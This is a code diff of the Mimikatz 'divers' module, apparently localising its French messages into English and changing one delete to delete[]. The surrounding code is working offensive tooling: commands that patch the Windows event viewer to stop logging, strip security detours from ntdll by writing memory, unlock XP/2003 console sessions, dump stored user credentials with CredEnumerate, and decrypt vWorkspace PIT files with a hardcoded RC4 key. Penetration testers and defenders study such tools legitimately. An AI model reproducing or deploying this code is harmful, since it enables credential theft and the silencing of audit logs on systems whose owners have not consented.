@@ -8,12 +8,12 @@
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_divers::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(noroutemon,	L"noroutemon",	L"[experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch l\'observateur d\'événements pour ne plus rien enregistrer"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(secrets,		L"secrets",		L"Affiche les secrets utilisateur"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-détours SR"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"Déchiffre les fichiers PIT (Quest vWorkspace Client)"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(noroutemon,	L"noroutemon",	L"[experimental] Patch Juniper Network Connect to no longer supervise the routing table"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch the event viewer to not save anything"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch cancel button of Windows XP and 2003 console to unlock a session"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(secrets,		L"secrets",		L"Displays the user secret"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-SR detours"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"Decrypts files (PIT Quest vWorkspace Client)"));
 	return monVector;
 }
 
@@ -34,15 +34,15 @@ bool mod_mimikatz_divers::nodetour(vector<wstring> * arguments)
 		PBYTE monNTDLLptr = reinterpret_cast<PBYTE>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtOpenProcess"));
 		if(memcmp(monNTDLLptr + 8, monDetouredStub, sizeof(monDetouredStub)) == 0)
 		{
-			wcout << L"Détour trouvé et ";
+			wcout << L"Detour and found ";
 			if(mod_memory::writeMemory(monNTDLLptr + 8 + sizeof(monDetouredStub) + sizeof(LONG) + *reinterpret_cast<PLONG>(monNTDLLptr + 8 + sizeof(monDetouredStub)), monSysEnterRetn, sizeof(monSysEnterRetn)))
-				wcout << L"patché :)";
+				wcout << L"patched :)";
 			else
-				wcout << L"NON patché :(";
+				wcout << L"Not patched :(";
 			wcout << endl;
 		}
 		else
-			wcout << L"Détour non trouvé" << endl;
+			wcout << L"Detour not found" << endl;
 	}
 	return true;
 }
@@ -176,7 +176,7 @@ bool mod_mimikatz_divers::secrets(vector<wstring> * arguments)
 
 	if(CredEnumerate(NULL, flags, &credNb, &pCredential))
 	{
-		wcout << L"Nombre de secrets : " << credNb << endl;
+		wcout << L"Number of secrets : " << credNb << endl;
 		
 		for(DWORD i = 0; i < credNb; i++)
 		{
@@ -257,7 +257,7 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 	}
 	else
 	{
-		wcout << L" * Ouverture en lecture du fichier \'" << arguments->front() << L"\' : ";
+		wcout << L" * Opening file for reading \'" << arguments->front() << L"\' : ";
 		if(monFichierSource = _wfopen(arguments->front().c_str(), L"rb"))
 		{
 			fseek(monFichierSource, 0, SEEK_END);
@@ -267,13 +267,13 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 			fread(monBuffer, tailleFichierSource, 1, monFichierSource);
 			fclose(monFichierSource);
 
-			wcout << L"OK" << endl << L" * Déchiffrement n°1 : ";
+			wcout << L"OK" << endl << L" * Decrypting n°1 : ";
 			if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource, HARDCODED_KEY, sizeof(HARDCODED_KEY), CALG_RC4))
 			{
-				wcout << L"OK" << endl << L" * Déchiffrement n°2 : ";
+				wcout << L"OK" << endl << L" * Decrypting n°2 : ";
 				if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource - SUBKEY_SIZE, monBuffer + tailleFichierSource - SUBKEY_SIZE, SUBKEY_SIZE, CALG_RC4))
 				{
-					wcout << L"OK" << endl << L" * En-tête : ";
+					wcout << L"OK" << endl << L" * Header : ";
 					if(memcmp(monBuffer, HEADER_PIT, sizeof(HEADER_PIT)) == 0)
 					{
 						wcout << L"OK" << endl;
@@ -282,7 +282,7 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 
 						if(arguments->size() > 1)
 						{
-							wcout << L" * Ouverture en écriture du fichier \'" << arguments->back() << L"\' : ";
+							wcout << L" * Opening file for writing \'" << arguments->back() << L"\' : ";
 							if(monFichierDestination = _wfopen(arguments->back().c_str(), L"wb"))
 							{
 								wcout << L"OK" << endl;
@@ -291,14 +291,14 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 							}
 							else wcout << L"KO" << endl;
 						}
-						else wcout << L" * Données : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
+						else wcout << L" * Data : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
 					}
-					else wcout << L"KO - différent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
+					else wcout << L"KO - Different \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
 				}
 				else wcout << L"KO";
 			}
 			else wcout << L"KO";
-			delete(monBuffer);
+			delete [] monBuffer;
 		}
 		else wcout << L"KO" << endl;
 	}
